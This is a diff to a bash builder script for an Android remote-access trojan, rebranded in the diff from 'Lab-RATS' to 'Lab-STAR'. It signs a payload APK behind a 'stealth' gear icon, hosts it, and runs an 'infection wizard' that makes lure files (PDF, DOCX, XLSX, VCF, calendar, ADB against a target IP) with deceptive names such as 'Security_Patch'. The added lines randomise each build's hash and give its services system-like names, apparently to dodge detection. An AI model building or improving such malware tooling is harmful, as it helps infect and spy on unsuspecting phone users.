@@ -1,11 +1,11 @@
 #!/bin/bash
 
 #################################################
-#          Lab-RATS APK BUILDER - Linux/Mac       #
-#                   v1.4.5 Hardened              #
+#          Lab-STAR APK BUILDER - Linux/Mac       #
+#                   v1.5.0 Hardened              #
 #                                               #
-#  Developed by: Lab-RATS.LABS                  #
-#  GitHub: https://github.com/K4N3CO-LABS/Lab-RATS #
+#  Developed by: Lab-STAR.LABS                  #
+#  GitHub: https://github.com/K4N3CO-LABS/Lab-STAR #
 #################################################
 
 # Colors for output
@@ -40,8 +40,8 @@ print_banner() {
     echo " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │"
     echo " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │"
     echo " │                                                              │"
-    echo " │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │"
-    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │"
+    echo " │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │"
+    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-STAR           │"
     echo " │                                                              │"
     echo " └──────────────────────────────────────────────────────────────┘"
     echo -e "${NC}"
@@ -86,7 +86,7 @@ generate_keystore() {
     read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
     read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}
 
-    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
+    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-STAR Developer, O=Lab-STAR.LABS, C=US" 2>/dev/null
     
     cat > "$PROJECT_DIR/keystore.properties" << EOF
 storeFile=lab-rats-keystore.jks
@@ -101,7 +101,7 @@ EOF
 configure_logo() {
     echo -e "${CYAN}[*] Logo Configuration${NC}"
     echo "    1. Use Recommended Stealth logo (grey gear)"
-    echo "    2. Use default Lab-RATS logo"
+    echo "    2. Use default Lab-STAR logo"
     echo "    3. Use custom logo (path)"
     echo "    4. Skip"
     read -p "    Choice (Default 1): " LOGO_OPTION
@@ -109,11 +109,11 @@ configure_logo() {
 
     case $LOGO_OPTION in
         1)
+           # Recommended Stealth logo (Zoomed out 15% for perfect fit)
            if command -v magick &> /dev/null; then
-               # Zoomed in 25% (Crop Zoom Effect)
-               magick convert "$COVERT_LOGO" -resize 125% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
+               magick convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
            elif command -v convert &> /dev/null; then
-               convert "$COVERT_LOGO" -resize 125% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
+               convert "$COVERT_LOGO" -resize 85% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
            else
                cp "$COVERT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null
            fi
@@ -182,6 +182,18 @@ configure_app() {
     else
         echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
     fi
+
+    # Add Binary Signature Entropy (Unique build hash)
+    mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
+    for i in {1..3}; do
+        head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
+    done
+
+    # Randomize Service Labels in Manifest
+    MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
+    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service")
+    RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
+    sed -i '' "s|android:label=\"Core Processor\"|android:label=\"$RAND_NAME\"|g" "$MANIFEST"
 }
 
 # Progress bar function (SMOOTH OVERWRITE STYLE)
@@ -208,18 +220,30 @@ execute_build() {
         local spaces=$(printf "%${empty}s")
 
         # Print using carriage return (\r) for smooth overwrite
-        printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}" "$label" "$percentage"
+        # If we reach the end but Gradle is still working, stay at 99% Finishing
+        if [ $i -eq $steps ]; then
+            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
+        else
+            printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}\033[K" "$label" "$percentage"
+        fi
 
         sleep $sleep_time
+    done
+
+    # Wait for actual completion without hanging at 100%
+    while kill -0 $pid 2>/dev/null; do
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 99%% ${YELLOW}[FINISHING...]${NC}\033[K" "$label"
+        sleep 0.5
     done
 
     wait $pid
     local status=$?
 
+    # CLEAR LINE and print final result to prevent overlap
     if [ $status -eq 0 ]; then
-        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\n" "$label"
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\033[K\n" "$label"
     else
-        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\n" "$label"
+        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\033[K\n" "$label"
     fi
 
     return $status
@@ -232,16 +256,17 @@ build_apk() {
     cd "$PROJECT_DIR"
     chmod +x gradlew
 
-    execute_build "clean assembleRelease" "Compiling Resources & Signing" 15
+    # Slowed down from 15s to 25s to better match modern Gradle build times
+    execute_build "clean assembleRelease" "Compiling Resources & Signing" 25
     local BUILD_STATUS=$?
 
     mkdir -p "$SCRIPT_DIR/output"
     if [ $BUILD_STATUS -eq 0 ] && [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
-        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_payload.apk"
-        echo -e "\n${GREEN}[✓] Success: output/signed_payload.apk${NC}"
+        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
+        echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
         echo -e "${YELLOW}[*] The build task is complete.${NC}"
         echo ""
-        read -p "    Press Enter to return to menu..."
+        read -p "    Press Enter to continue..."
     else
         echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
         echo -e "${YELLOW}[*] Check build_log.txt for details.${NC}"
@@ -281,7 +306,7 @@ infection_wizard() {
     configure_app
     build_apk || return
 
-    local SIGNED_APK="$SCRIPT_DIR/output/signed_payload.apk"
+    local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
 
     echo ""
     echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
@@ -320,15 +345,15 @@ infection_wizard() {
     read -p "    Choice: " V
     case $V in
         1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
-        2) generate_exploit_standalone "pdf" "$DOWNLOAD_URL" "URGENT_SECURITY_CLEARANCE" ;;
-        3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Audit_Review" ;;
+        2) generate_exploit_standalone "pdf" "$DOWNLOAD_URL" "Security_Audit" ;;
+        3) generate_exploit_standalone "ics" "$DOWNLOAD_URL" "Security_Sync" ;;
         4) generate_exploit_standalone "dolby" "$DOWNLOAD_URL" ;;
         5) read -p "    Target IP: " TIP; generate_exploit_standalone "adb" "$DOWNLOAD_URL" "$TIP" ;;
-        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System Update" ;;
+        6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System_Update" ;;
         7) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
-        8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System Update" ;;
-        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Urgent_Security_Patch" ;;
-        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Statement_Q4" ;;
+        8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System_Update" ;;
+        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
+        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
         *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
     esac
 
@@ -340,7 +365,7 @@ infection_wizard() {
 # Documentation Section
 show_help() {
     print_banner
-    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.4.5${NC}"
+    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.0${NC}"
     echo "------------------------------------------------------------"
     echo -e "1. Start Build: Standard production flow."
     echo -e "2. Keystore Only: Unique signing certificate."
@@ -384,4 +409,6 @@ main_menu() {
 # Run
 while true; do
     main_menu
+    # Clean up temporary build artifacts after every loop cycle
+    rm -rf "$SCRIPT_DIR/bin"
 done
